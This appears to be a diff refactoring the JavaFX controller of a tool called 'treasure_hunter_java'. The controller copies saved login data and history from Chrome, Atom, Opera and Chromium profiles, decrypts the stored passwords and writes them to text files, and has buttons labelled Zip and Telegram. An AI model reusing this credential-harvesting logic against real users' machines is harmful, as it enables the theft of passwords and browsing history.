@@ -5,26 +5,15 @@ import com.treasure_hunter_java.decrypt.CopyFiles;
 import com.treasure_hunter_java.decrypt.Decrypt;
 import com.treasure_hunter_java.browsers.*;
 import javafx.fxml.FXML;
-import javafx.fxml.FXMLLoader;
-import javafx.fxml.Initializable;
-import javafx.scene.Parent;
-import javafx.scene.Scene;
 import javafx.scene.control.*;
-import javafx.scene.image.Image;
-import javafx.stage.DirectoryChooser;
-import javafx.stage.Stage;
-import jfxtras.styles.jmetro.JMetro;
-import jfxtras.styles.jmetro.Style;
-
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.file.Path;
+import java.util.ArrayList;
 
 public class MainController extends Controller {
-
-    @FXML
-    private Button searchPasswordsButton;
 
     @FXML
     private CheckBox passwordsGoogle;
@@ -50,24 +39,6 @@ public class MainController extends Controller {
     @FXML
     private CheckBox historyChromium;
 
-    @FXML
-    private Button generateDictionaryButton;
-
-    @FXML
-    private Button reportButton;
-
-    @FXML
-    private Button zipButton;
-
-    @FXML
-    private Button telegramButton;
-
-    @FXML
-    private Button selectDirectoryButton;
-
-    @FXML
-    private Button start;
-
     private void writeData(String text, String dataName, String browserDirectory) throws IOException {
 
         File file = new File(Main.mainWorkDirectory + browserDirectory + dataName);
@@ -85,14 +56,19 @@ public class MainController extends Controller {
         chrome.collectProfiles();
         String browserName = "/chrome_data/";
 
-        if (passwordsGoogle.isSelected()){
-            copyFiles.copyLoginData(chrome.getProfiles(), chrome.getLocalState(), browserName);
+        test(copyFiles, browserName, passwordsGoogle, chrome.getProfiles(), chrome.getLocalState(), historyGoogle);
+    }
+
+    private void test(CopyFiles copyFiles, String browserName, CheckBox passwords, ArrayList<Path> profiles,
+                      Path localState, CheckBox history) throws Exception {
+        if (passwords.isSelected()){
+            copyFiles.copyLoginData(profiles, localState, browserName);
             writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                     "passwords.txt", browserName);
         }
 
-        if (historyGoogle.isSelected()){
-            copyFiles.copyHistory(chrome.getProfiles(), chrome.getLocalState(), browserName);
+        if (history.isSelected()){
+            copyFiles.copyHistory(profiles, browserName);
             writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                     "history.txt", browserName);
         }
@@ -104,17 +80,7 @@ public class MainController extends Controller {
         atom.collectProfiles();
         String browserName = "/atom_data/";
 
-        if (passwordsAtom.isSelected()) {
-            copyFiles.copyLoginData(atom.getProfiles(), atom.getLocalState(), browserName);
-            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
-                    "passwords.txt", browserName);
-        }
-
-        if (historyAtom.isSelected()){
-            copyFiles.copyHistory(atom.getProfiles(), atom.getLocalState(), browserName);
-            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
-                    "history.txt", browserName);
-        }
+        test(copyFiles, browserName, passwordsAtom, atom.getProfiles(), atom.getLocalState(), historyAtom);
     }
 
     private void getOperaData(CopyFiles copyFiles) throws Exception {
@@ -123,17 +89,7 @@ public class MainController extends Controller {
         opera.collectProfiles();
         String browserName = "/opera_data/";
 
-        if (passwordsOpera.isSelected()) {
-            copyFiles.copyLoginData(opera.getProfiles(), opera.getLocalState(), browserName);
-            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
-                    "passwords.txt", browserName);
-        }
-
-        if (historyOpera.isSelected()) {
-            copyFiles.copyHistory(opera.getProfiles(), opera.getLocalState(), browserName);
-            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
-                    "history.txt", browserName);
-        }
+        test(copyFiles, browserName, passwordsOpera, opera.getProfiles(), opera.getLocalState(), historyOpera);
     }
 
     private void getChromiumData(CopyFiles copyFiles) throws Exception {
@@ -142,44 +98,40 @@ public class MainController extends Controller {
         chromium.collectProfiles();
         String browserName = "/chromium_data/";
 
-        if (passwordsChromium.isSelected()) {
-            copyFiles.copyLoginData(chromium.getProfiles(), chromium.getLocalState(), browserName);
-            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
-                    "passwords.txt", browserName);
-        }
-
-        if (historyChromium.isSelected()) {
-            copyFiles.copyHistory(chromium.getProfiles(), chromium.getLocalState(), browserName);
-            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
-                    "history.txt", browserName);
-        }
+        test(copyFiles, browserName, passwordsChromium, chromium.getProfiles(), chromium.getLocalState(), historyChromium);
     }
 
+    @Override
     @FXML
     protected void onSearchPasswordsButtonClick() throws IOException {
         super.onSearchPasswordsButtonClick();
     }
 
+    @Override
     @FXML
-    protected void GenerateDictionaryButtonClick() throws IOException {
+    protected void onGenerateDictionaryButtonClick() throws IOException {
         super.onGenerateDictionaryButtonClick();
     }
 
+    @Override
     @FXML
-    protected void onReportButtonClick() throws Exception {
+    protected void onReportButtonClick() throws IOException {
         super.onReportButtonClick();
     }
 
+    @Override
     @FXML
     protected void onZipButtonClick() throws IOException {
         super.onZipButtonClick();
     }
 
+    @Override
     @FXML
     protected void onTelegramButtonClick() throws IOException {
         super.onTelegramButtonClick();
     }
 
+    @Override
     @FXML
     protected void onSelectDirectoryButtonClick() {
         super.onSelectDirectoryButtonClick();
